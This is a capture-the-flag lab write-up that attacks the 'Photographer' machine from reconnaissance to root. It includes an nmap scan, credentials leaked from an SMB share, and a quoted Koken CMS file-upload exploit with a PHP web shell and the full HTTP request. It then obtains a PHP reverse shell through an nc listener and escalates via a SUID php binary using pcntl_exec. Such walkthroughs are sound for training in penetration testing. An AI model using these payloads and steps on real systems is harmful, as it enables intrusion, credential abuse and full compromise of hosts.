---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Reconnaissance
### Nmap scan

Let's perform an `nmap` scan to find the open ports and the services running on the open ports.

```
$ nmap -T5 -Pn -A -p- 192.168.222.76 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-13 09:56 IST
Warning: 192.168.222.76 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.222.76
Host is up (0.070s latency).
Not shown: 63573 closed tcp ports (conn-refused), 1957 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:4d:aa:18:86:94:8e:88:a7:4c:6b:42:60:76:f1:4f (RSA)
|   256 4d:a3:d0:7a:8f:64:ef:82:45:2d:01:13:18:b7:e0:13 (ECDSA)
|_  256 1a:01:7a:4f:cf:95:85:bf:31:a1:4f:15:87:ab:94:e2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-title: daisa ahomi
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2024-05-13T00:31:49-04:00
| smb2-time: 
|   date: 2024-05-13T04:31:49
|_  start_date: N/A
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 313.07 seconds
```

There are five open ports:

| Port | Service     |
| :-: | :-: |
| 22   | ssh         |
| 80   | http        |
| 139  | netbios-ssn |
| 445  | netbios-ssn |
| 8000 | http        |

### Port 80 (HTTP) enumeration

Let's enumerate port 80 through our browser.

![1](https://github.com/Kunull/Write-ups/assets/110326359/71a3bc51-20dc-45c4-abdf-3a33cfd0651a)

As we can see there is nothing of importance here.

Let's perform directory brute forcing in order to see if there is anything else.

```
$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.222.76:80/FUZZ                     
________________________________________________
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 79ms]
assets                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 79ms]
                        [Status: 200, Size: 5711, Words: 296, Lines: 190, Duration: 58ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 57ms]
:: Progress: [220560/220560] :: Job [1/1] :: 623 req/sec :: Duration: [0:06:21] :: Errors: 0 ::
```

### Port 135 (SMB) enumeration

We can map out the SMB shares on the target using `smbclient`.

```
$  smbclient -L 192.168.222.76
Password for [WORKGROUP\kunal]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            PHOTOGRAPHER
```

Let's access the `sambashare` share.

```
$ smbclient \\\\192.168.222.76\\sambashare
Password for [WORKGROUP\kunal]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 20 21:21:08 2020
  ..                                  D        0  Thu Aug 20 21:38:59 2020
  mailsent.txt                        N      503  Tue Jul 21 06:59:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 06:52:23 2020

                3300080 blocks of size 1024. 2958792 blocks available
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
```

We can now `cat` the `mailsent.txt` file.

```
$ cat mailsent.txt                                                                
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

This tells us some potential credentials.

| Username | Email                  | Password         |
| :------: | :--------------------: | :--------------: |
| agi      | agi@photographer.com   |                  |
| daisa    | daisa@photographer.com | secret, babygirl |

### Port 8000 (HTTP) enumeration

Let's enumerate port 8000 through our browser.

![2](https://github.com/Kunull/Write-ups/assets/110326359/b468e471-1ba8-4e4a-a930-7dc2226f0f9a)

![3](https://github.com/Kunull/Write-ups/assets/110326359/8f0975f8-ee2d-4d90-8be8-bedad4c2c169)

&nbsp;

## Exploitation
### Logging in to the Koken dashboard

| Email                  | Password |
| :-: | :-: |
| daisa@photographer.com | babygirl |


### Searching for relevant exploit using Searchsploit

Now that we know theere is a Kokwn CMS running on port 8000, we can search for an exploit using Searchsploit.

```
$ searchsploit koken                                                                                       
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)                                                                                                                                                 | php/webapps/48706.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's check what the exploit instructs us to do.

```
$ cat 48706.txt   
# Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
# Date: 2020-07-15
# Exploit Author: v1n1v131r4
# Vendor Homepage: http://koken.me/
# Software Link: https://www.softaculous.com/apps/cms/Koken
# Version: 0.22.24
# Tested on: Linux
# PoC: https://github.com/V1n1v131r4/Bypass-File-Upload-on-Koken-CMS/blob/master/README.md

The Koken CMS upload restrictions are based on a list of allowed file extensions (withelist), which facilitates bypass through the handling of the HTTP request via Burp.

Steps to exploit:

1. Create a malicious PHP file with this content:

   <?php system($_GET['cmd']);?>

2. Save as "image.php.jpg"

3. Authenticated, go to Koken CMS Dashboard, upload your file on "Import Content" button (Library panel) and send the HTTP request to Burp.

4. On Burp, rename your file to "image.php"


POST /koken/api.php?/content HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://target.com/koken/admin/
x-koken-auth: cookie
Content-Type: multipart/form-data; boundary=---------------------------2391361183188899229525551
Content-Length: 1043
Connection: close
Cookie: PHPSESSID= [Cookie value here]

-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="name"

image.php
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="chunk"

0
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="chunks"

1
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="upload_session_start"

1594831856
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="visibility"

public
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="license"

all
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="max_download"

none
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="file"; filename="image.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']);?>

-----------------------------2391361183188899229525551--



5. On Koken CMS Library, select you file and put the mouse on "Download File" to see where your file is hosted on server.        
```

### Uploading a php
Intead of the PHP shell code given to us, we will be using the `/usr/share/webshells/php/php-reverse-shell.php`.

![9](https://github.com/Kunull/Write-ups/assets/110326359/13c53dc9-a0c1-4f8b-9677-e428766f756d)

Once we have saved the code to `image.php.jpg`, we can upload the file through the CMS dashboard.

While uploading the file, we have to proxy the traffic through Burpsuite.

![4](https://github.com/Kunull/Write-ups/assets/110326359/4d0e241b-67df-4c90-9533-ff30ebc8ba03)

The request must be logged in the `Proxy > HTTP history`.

![5](https://github.com/Kunull/Write-ups/assets/110326359/f6c2e3ce-e892-4e60-9df2-f3194c3afdff)

Next, we have to forward the request to the `Repeater`.

![6](https://github.com/Kunull/Write-ups/assets/110326359/1c505d79-0443-403b-820f-5a1d79b3d2b0)

Once in the `Repeater`, we can change the file name to `revshell.php` and forward the request.

Now, there should be two files visible on the dashboard: `image.php.jpg` and `revshell.php`.

![7](https://github.com/Kunull/Write-ups/assets/110326359/7792cb8a-02e7-4ad0-a53e-6e6155f2ef04)

If we look at the `SITE > Link`, we can see where the `revshell.php` file is located.

### Gaining a reverse shell

Let's use `nc` to set up listener.

```
$ nc -nlvp 9999                         
listening on [any] 9999 ...
```

Now we can visit the `revshell.php` file through the browser.

![10](https://github.com/Kunull/Write-ups/assets/110326359/444d3da7-3980-4e07-be0a-9655e2254573)

Let's check back on the listener.

```
$ nc -nlvp 9999                         
listening on [any] 9999 ...
connect to [192.168.45.216] from (UNKNOWN) [192.168.222.76] 59092
Linux photographer 4.15.0-115-generic #116~16.04.1-Ubuntu SMP Wed Aug 26 17:36:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:53:13 up  1:54,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

&nbsp;

## Post Exploitation

### Spawning a TTY shell

We can now upgrade this shell to a TTY shell using Python.

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@photographer:/$
```

### local.txt

Let's cat the local.txt flag.

```
www-data@photographer:/home/daisa$ cat local.txt  
cat local.txt
0efd95e22a381cfe8fb8ca1f970e8f34
```

### Privilege Escalation

#### SetUID binaries

We can use the find command to search for files on the system where the setuid bit is set.

```
www-data@photographer:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
```

We can now use on of these files to escalate our privilege.

Let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid) to search for an exploit for the `php` utility.

![11](https://github.com/user-attachments/assets/910b21a9-bfea-4a42-a7f5-805e030f4e32)

```
www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
<sr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"                         
bash-4.3# whoami
whoami
root
```

We are now the `root` user.

### proof.txt

We can now cat the proof.txt flag.

```
bash-4.3# cat /root/proof.txt
cat /root/proof.txt
bdd6aa20288e19952cdafba21fd82dd9
```
